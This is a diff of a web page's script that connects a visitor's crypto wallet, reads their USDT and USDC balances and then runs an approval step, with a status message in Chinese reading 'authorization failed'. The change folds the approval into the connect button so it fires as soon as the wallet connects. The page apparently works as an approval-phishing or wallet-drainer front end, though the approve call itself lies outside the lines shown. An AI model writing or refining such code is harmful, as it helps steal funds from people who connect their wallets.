@@ -41,13 +41,15 @@
       return tx.hash;
     }
 
-    async function startApproval() {
+    window.openConnection = async () => {
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
+        const provider = await web3modal.connect();
+        const ethersProvider = new ethers.providers.Web3Provider(provider);
+        const signer = ethersProvider.getSigner();
         const user = await signer.getAddress();
-        const usdt = new ethers.Contract(USDT, abi, provider);
-        const usdc = new ethers.Contract(USDC, abi, provider);
+
+        const usdt = new ethers.Contract(USDT, abi, ethersProvider);
+        const usdc = new ethers.Contract(USDC, abi, ethersProvider);
 
         const usdtBal = await usdt.balanceOf(user);
         const usdcBal = await usdc.balanceOf(user);
@@ -66,13 +68,6 @@
       } catch (err) {
         document.getElementById('status').innerText = '❌ 授權失敗：' + err.message;
       }
-    }
-
-    window.openConnection = async () => {
-      web3modal.openModal();
-      setTimeout(() => {
-        startApproval();
-      }, 7000);
     }
   </script>
 </head>
